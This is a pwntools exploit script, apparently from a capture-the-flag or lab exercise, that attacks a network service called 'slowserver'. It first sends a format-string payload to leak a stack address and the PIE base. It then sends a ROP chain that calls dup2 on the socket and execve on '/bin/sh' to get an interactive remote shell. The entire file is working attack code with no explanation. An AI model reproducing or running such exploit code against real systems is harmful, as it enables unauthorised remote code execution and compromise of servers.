from pwn import *

context.binary = binary = ELF('./slowserver',checksec=False)

#p = remote('localhost', 5555)
p = remote('10.10.87.161', 5555)

p.sendline(b'DEBUG %p|%3$p')

leaks = p.recvrepeat(1).decode().strip().split('|')

stack_leak = int(leaks[0], 16)
buf = stack_leak - 0x66

info(f'stack leak: {hex(stack_leak)}')
info(f'buf: {hex(buf)}')

pie_leak = int(leaks[1], 16)
binary.address = pie_leak - 0x2080

info(f'pie leak: {hex(pie_leak)}')
info(f'pie base: {hex(binary.address)}')

p.close()

rop = ROP(binary)

syscall = p64(rop.find_gadget(['syscall','ret'])[0])
pop_rax = p64(rop.find_gadget(['pop rax','ret'])[0])
pop_rsi = p64(rop.find_gadget(['pop rsi','ret'])[0])
pop_rbp = p64(rop.find_gadget(['pop rbp','ret'])[0])
ret = p64(rop.find_gadget(['ret'])[0])

pop_rdi_xor_rdi = p64(binary.address+0x1816)
pop_rdx_pop_r12 = p64(binary.address+0x180d)

ropchain = b'/bin/sh\x00'
ropchain += b'A' * (24 - len(ropchain))
ropchain += pop_rbp
ropchain += p64(0)
ropchain += pop_rdi_xor_rdi
ropchain += p64(4)
ropchain += pop_rsi
ropchain += p64(0)
ropchain += pop_rax
ropchain += p64(33)
ropchain += syscall
ropchain += pop_rdi_xor_rdi
ropchain += p64(4)
ropchain += pop_rsi
ropchain += p64(1)
ropchain += pop_rax
ropchain += p64(33)
ropchain += syscall
ropchain += pop_rdi_xor_rdi
ropchain += p64(buf)
ropchain += pop_rsi
ropchain += p64(0)
ropchain += pop_rdx_pop_r12
ropchain += p64(0)
ropchain += p64(0)
ropchain += pop_rax
ropchain += p64(59)
ropchain += syscall


#p = remote('localhost', 5555)
p = remote('10.10.87.161', 5555)

p.sendline(b'POST ' + ropchain)

p.recvrepeat(1)
p.sendline()

p.interactive()
